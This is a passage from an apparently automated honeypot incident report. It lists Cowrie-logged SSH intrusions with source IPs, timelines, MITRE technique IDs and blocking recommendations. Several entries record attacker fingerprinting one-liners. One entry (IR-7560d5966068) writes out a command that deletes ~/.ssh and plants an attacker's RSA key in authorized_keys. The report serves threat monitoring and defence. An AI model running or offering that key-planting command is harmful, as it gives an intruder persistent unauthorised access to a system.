| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:47:55` | `cowrie.session.connect` |
| `2026-07-02 17:47:56` | `cowrie.client.version` |
| `2026-07-02 17:47:56` | `cowrie.client.kex` |
| `2026-07-02 17:47:57` | `cowrie.login.success` |
| `2026-07-02 17:47:59` | `cowrie.session.params` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.success` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.command.input` |
| `2026-07-02 17:47:59` | `cowrie.log.closed` |
| `2026-07-02 17:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8585e5e62356

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 17:48 |
| **Last Seen** | 2026-07-02 17:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:48:28` | `cowrie.session.connect` |
| `2026-07-02 17:48:29` | `cowrie.client.version` |
| `2026-07-02 17:48:29` | `cowrie.client.kex` |
| `2026-07-02 17:48:34` | `cowrie.login.success` |
| `2026-07-02 17:48:38` | `cowrie.session.params` |
| `2026-07-02 17:48:38` | `cowrie.command.input` |
| `2026-07-02 17:48:40` | `cowrie.log.closed` |
| `2026-07-02 17:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c17592c0587

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 17:49 |
| **Last Seen** | 2026-07-02 17:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:49:56` | `cowrie.session.connect` |
| `2026-07-02 17:49:57` | `cowrie.client.version` |
| `2026-07-02 17:49:57` | `cowrie.client.kex` |
| `2026-07-02 17:49:58` | `cowrie.login.success` |
| `2026-07-02 17:50:00` | `cowrie.session.params` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.success` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:00` | `cowrie.command.input` |
| `2026-07-02 17:50:01` | `cowrie.log.closed` |
| `2026-07-02 17:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6763bf8a70a7

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 17:51 |
| **Last Seen** | 2026-07-02 17:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:51:52` | `cowrie.session.connect` |
| `2026-07-02 17:51:52` | `cowrie.client.version` |
| `2026-07-02 17:51:52` | `cowrie.client.kex` |
| `2026-07-02 17:51:53` | `cowrie.login.success` |
| `2026-07-02 17:51:54` | `cowrie.session.params` |
| `2026-07-02 17:51:54` | `cowrie.command.input` |
| `2026-07-02 17:51:55` | `cowrie.log.closed` |
| `2026-07-02 17:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b381b2e1b0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 17:52 |
| **Last Seen** | 2026-07-02 17:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:52:30` | `cowrie.session.connect` |
| `2026-07-02 17:52:30` | `cowrie.client.version` |
| `2026-07-02 17:52:30` | `cowrie.client.kex` |
| `2026-07-02 17:52:32` | `cowrie.login.success` |
| `2026-07-02 17:52:33` | `cowrie.session.params` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.success` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:33` | `cowrie.command.input` |
| `2026-07-02 17:52:34` | `cowrie.log.closed` |
| `2026-07-02 17:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b2cc52cda10

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]119` |
| **First Seen** | 2026-07-02 17:52 |
| **Last Seen** | 2026-07-02 17:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:52:41` | `cowrie.session.connect` |
| `2026-07-02 17:52:42` | `cowrie.login.success` |
| `2026-07-02 17:52:42` | `cowrie.session.params` |
| `2026-07-02 17:52:43` | `cowrie.command.input` |
| `2026-07-02 17:52:43` | `cowrie.command.input` |
| `2026-07-02 17:52:44` | `cowrie.command.input` |
| `2026-07-02 17:52:44` | `cowrie.command.input` |
| `2026-07-02 17:52:44` | `cowrie.command.failed` |
| `2026-07-02 17:52:45` | `cowrie.log.closed` |
| `2026-07-02 17:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]119` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-106f21dfecda

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 17:56 |
| **Last Seen** | 2026-07-02 17:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:56:24` | `cowrie.session.connect` |
| `2026-07-02 17:56:24` | `cowrie.client.version` |
| `2026-07-02 17:56:24` | `cowrie.client.kex` |
| `2026-07-02 17:56:25` | `cowrie.login.success` |
| `2026-07-02 17:56:26` | `cowrie.session.params` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.success` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.command.input` |
| `2026-07-02 17:56:26` | `cowrie.log.closed` |
| `2026-07-02 17:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc69d91d08b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 17:58 |
| **Last Seen** | 2026-07-02 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:58:28` | `cowrie.session.connect` |
| `2026-07-02 17:58:28` | `cowrie.client.version` |
| `2026-07-02 17:58:28` | `cowrie.client.kex` |
| `2026-07-02 17:58:29` | `cowrie.login.success` |
| `2026-07-02 17:58:30` | `cowrie.session.params` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.success` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.command.input` |
| `2026-07-02 17:58:30` | `cowrie.log.closed` |
| `2026-07-02 17:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7560d5966068

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-07-02 17:59 |
| **Last Seen** | 2026-07-02 17:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:59:21` | `cowrie.session.connect` |
| `2026-07-02 17:59:21` | `cowrie.client.version` |
| `2026-07-02 17:59:21` | `cowrie.client.kex` |
| `2026-07-02 17:59:22` | `cowrie.login.success` |
| `2026-07-02 17:59:23` | `cowrie.session.params` |
| `2026-07-02 17:59:23` | `cowrie.command.input` |
| `2026-07-02 17:59:23` | `cowrie.command.failed` |
| `2026-07-02 17:59:24` | `cowrie.log.closed` |
| `2026-07-02 17:59:25` | `cowrie.session.params` |
| `2026-07-02 17:59:25` | `cowrie.command.input` |
| `2026-07-02 17:59:25` | `cowrie.session.file_download` |
| `2026-07-02 17:59:25` | `cowrie.log.closed` |
| `2026-07-02 17:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5a9f2a6432

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-07-02 17:59 |
| **Last Seen** | 2026-07-02 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:59:25` | `cowrie.session.connect` |
| `2026-07-02 17:59:25` | `cowrie.client.version` |
| `2026-07-02 17:59:26` | `cowrie.client.kex` |
| `2026-07-02 17:59:27` | `cowrie.login.success` |
| `2026-07-02 17:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa202979b82a

| Field | Detail |
|---|---|
| **Source IP** | `203.205.37[.]233` |
| **First Seen** | 2026-07-02 17:59 |
| **Last Seen** | 2026-07-02 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:59:27` | `cowrie.session.connect` |
| `2026-07-02 17:59:27` | `cowrie.client.version` |
| `2026-07-02 17:59:27` | `cowrie.client.kex` |
| `2026-07-02 17:59:29` | `cowrie.login.success` |
| `2026-07-02 17:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.205.37[.]233` to AbuseIPDB if not already reported
- [ ] Block `203.205.37[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a37ef05966b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 17:59 |
| **Last Seen** | 2026-07-02 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:59:48` | `cowrie.session.connect` |
| `2026-07-02 17:59:48` | `cowrie.client.version` |
| `2026-07-02 17:59:48` | `cowrie.client.kex` |
| `2026-07-02 17:59:49` | `cowrie.login.success` |
| `2026-07-02 17:59:49` | `cowrie.session.params` |
| `2026-07-02 17:59:49` | `cowrie.command.input` |
| `2026-07-02 17:59:49` | `cowrie.log.closed` |
| `2026-07-02 17:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966233edd086

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 17:59 |
| **Last Seen** | 2026-07-02 18:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 17:59:55` | `cowrie.session.connect` |
| `2026-07-02 17:59:56` | `cowrie.client.version` |
| `2026-07-02 17:59:56` | `cowrie.client.kex` |
| `2026-07-02 18:00:03` | `cowrie.login.success` |
| `2026-07-02 18:00:06` | `cowrie.session.params` |
| `2026-07-02 18:00:06` | `cowrie.command.input` |
| `2026-07-02 18:00:08` | `cowrie.log.closed` |
| `2026-07-02 18:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3850c3de658

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 18:00 |
| **Last Seen** | 2026-07-02 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:00:47` | `cowrie.session.connect` |
| `2026-07-02 18:00:47` | `cowrie.client.version` |
| `2026-07-02 18:00:48` | `cowrie.client.kex` |
| `2026-07-02 18:00:48` | `cowrie.login.success` |
| `2026-07-02 18:00:49` | `cowrie.session.params` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.success` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.command.input` |
| `2026-07-02 18:00:49` | `cowrie.log.closed` |
| `2026-07-02 18:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-197b7e5115db

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 18:05 |
| **Last Seen** | 2026-07-02 18:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:05:36` | `cowrie.session.connect` |
| `2026-07-02 18:05:37` | `cowrie.client.version` |
| `2026-07-02 18:05:37` | `cowrie.client.kex` |
| `2026-07-02 18:05:38` | `cowrie.login.success` |
| `2026-07-02 18:05:40` | `cowrie.session.params` |
| `2026-07-02 18:05:40` | `cowrie.command.input` |
| `2026-07-02 18:05:40` | `cowrie.log.closed` |
| `2026-07-02 18:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8434367b30ce

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 18:11 |
| **Last Seen** | 2026-07-02 18:11 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:11:30` | `cowrie.session.connect` |
| `2026-07-02 18:11:32` | `cowrie.client.version` |
| `2026-07-02 18:11:32` | `cowrie.client.kex` |
| `2026-07-02 18:11:38` | `cowrie.login.success` |
| `2026-07-02 18:11:42` | `cowrie.session.params` |
| `2026-07-02 18:11:42` | `cowrie.command.input` |
| `2026-07-02 18:11:44` | `cowrie.log.closed` |
| `2026-07-02 18:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6307f4cf041a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 18:19 |
| **Last Seen** | 2026-07-02 18:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:19:38` | `cowrie.session.connect` |
| `2026-07-02 18:19:38` | `cowrie.client.version` |
| `2026-07-02 18:19:38` | `cowrie.client.kex` |
| `2026-07-02 18:19:40` | `cowrie.login.success` |
| `2026-07-02 18:19:41` | `cowrie.session.params` |
| `2026-07-02 18:19:41` | `cowrie.command.input` |
| `2026-07-02 18:19:42` | `cowrie.log.closed` |
| `2026-07-02 18:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9707f8e1288

| Field | Detail |
|---|---|
| **Source IP** | `107.173.85[.]94` |
| **First Seen** | 2026-07-02 18:19 |
| **Last Seen** | 2026-07-02 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:19:57` | `cowrie.session.connect` |
| `2026-07-02 18:19:57` | `cowrie.client.version` |
| `2026-07-02 18:19:57` | `cowrie.client.kex` |
| `2026-07-02 18:19:57` | `cowrie.login.success` |
| `2026-07-02 18:19:57` | `cowrie.session.params` |
| `2026-07-02 18:19:57` | `cowrie.command.input` |
| `2026-07-02 18:19:58` | `cowrie.log.closed` |
| `2026-07-02 18:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.85[.]94` to AbuseIPDB if not already reported
- [ ] Block `107.173.85[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d02b79bed69

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 18:23 |
| **Last Seen** | 2026-07-02 18:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 18:23:03` | `cowrie.session.connect` |
| `2026-07-02 18:23:05` | `cowrie.client.version` |
| `2026-07-02 18:23:05` | `cowrie.client.kex` |
